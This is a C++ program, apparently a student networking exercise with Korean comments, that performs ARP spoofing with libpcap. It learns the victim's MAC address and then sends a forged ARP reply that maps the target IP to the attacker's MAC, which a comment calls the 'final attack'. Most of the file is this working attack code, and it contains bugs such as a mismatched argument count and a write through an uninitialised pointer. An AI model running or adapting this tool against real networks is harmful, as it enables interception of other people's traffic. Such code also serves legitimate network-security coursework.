#include <cstdio>
#include <stdio.h>
#include <ifaddrs.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"

Mac getmymac(char *dev);
Ip getmyIP(char *dev);
void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
Mac get_sender_mac(pcap_t* handle);

#pragma pack(push, 1)
struct EthArpPacket final
{
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)

EthArpPacket packet;

void usage()
{
   printf("syntax: send-arp-test <interface>\n");
   printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char *argv[])
{
   if (argc != 4)
   {
      usage();
      return -1;
   }

   char *dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr)
   {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }

   //edit
   Mac mymac;
   Mac sender_mac;
   Mac target_mac;
   Ip myIP;
   Ip sender_IP;
   Ip target_IP;
   Mac broad = Mac::broadcastMac();
   Mac unknown = Mac::nullMac(); 
   sender_IP = Ip(std::string(argv[2]));   
   target_IP = Ip(std::string(argv[3]));
   //내 맥, 아이피 알아내기
   mymac = getmymac(dev);
   printf("My Mac: %s\n", std::string(mymac).data());
   myIP = getmyIP(dev);
   printf("My IP : %s\n", std::string(myIP).data());
   //상대 ip주소 활용해서 arp 보내기
   send_arp_packet(broad, mymac, 1, mymac, myIP, unknown, sender_IP, handle);
   //패킷 받아서 센더의 맥어드레스 알아내기
   sender_mac = get_sender_mac(handle);
   printf("Sender Mac: %s\n", std::string(sender_mac).data());
   //알아낸 정보들로 최종 공격하기
   send_arp_packet(sender_mac, mymac, 2, mymac, target_IP, sender_mac, sender_IP, handle);
   //edit



   pcap_close(handle);

}

Mac getmymac(char *dev)
{
   int fd;
   struct ifreq ifr;
   const char *iface = dev;
   Mac mac;
   char *mac2 = NULL;

   memset(&ifr, 0, sizeof(ifr));

   fd = socket(AF_INET, SOCK_DGRAM, 0);

   ifr.ifr_addr.sa_family = AF_INET;
   strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

   if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr))
   {
      mac = Mac((uint8_t* )ifr.ifr_hwaddr.sa_data);
   }
  
   close(fd);
   return mac;
}

Ip getmyIP(char *dev)
{
   int fd;
   struct ifreq ifr;
   Ip ip;
   
   fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);
   ioctl(fd, SIOCGIFADDR, &ifr);
   ip = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
   #ifdef IPtest
   char* testip;
   strcpy(testip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
   printf("[MY IP ADDR = %s]\n", testip);
   #endif //IPtest
   close(fd);  
   return ip;
}

void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle)
{

   packet.eth_.dmac_ = packet_eth_dmac;
   packet.eth_.smac_ = packet_eth_smac;
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   if (arphdr_option == 1)
   {
      packet.arp_.op_ = htons(ArpHdr::Request);
   }
   else if (arphdr_option == 2)
   {
      packet.arp_.op_ = htons(ArpHdr::Reply);
   }
   else
      return;

   packet.arp_.smac_ = packet_arp_smac; //22:22:22:22
   packet.arp_.sip_ = htonl(packet_arp_sip);
   packet.arp_.tmac_ = packet_arp_tmac;
   packet.arp_.tip_ = htonl(packet_arp_tip);

   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
   if (res != 0)
   {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }
}

Mac get_sender_mac(pcap_t* handle)
{
   struct pcap_pkthdr *header;
   const u_char *arp_reply_packet;
   int res = pcap_next_ex(handle, &header, &arp_reply_packet);
   if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
   {
      printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
      return 0;
   }
   EthArpPacket *sender_packet;
   sender_packet = (EthArpPacket *)arp_reply_packet;
   return sender_packet->arp_.smac_;
}